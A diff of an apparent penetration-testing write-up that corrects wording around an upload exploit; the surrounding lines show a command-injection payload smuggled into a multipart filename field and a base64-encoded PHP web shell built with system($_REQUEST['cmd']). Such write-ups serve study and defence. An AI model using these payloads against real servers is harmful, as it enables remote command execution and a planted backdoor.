@@ -154,7 +154,7 @@ if ( $auth == 0 ) {
 
 As we can see from the source code, the filename is used in shell command and
 we can inject malicious input. However the '/' or '\' characters are
-prohibited, because to $target is stored only the value after (back)slash.
+prohibited, because in $target is stored only the value after (back)slash.
 
 Locator (it never terminates, but confirms our finding):
 {% codeblock %}
@@ -168,7 +168,7 @@ Content-Disposition: form-data; name="uploaded"; filename=";`echo dG91Y2ggL3RtcC
 
 There could be a problem with a bigger input ("filename too long").
 
-Similarly we upload the following base64 payload:
+Similarly we upload the following base64 payload redirected to 'b.php':
 {% codeblock %}
 root@kali32:/var/www# echo '<?php system($_REQUEST['cmd']); ?>' | base64
 PD9waHAgc3lzdGVtKCRfUkVRVUVTVFtjbWRdKTsgPz4K
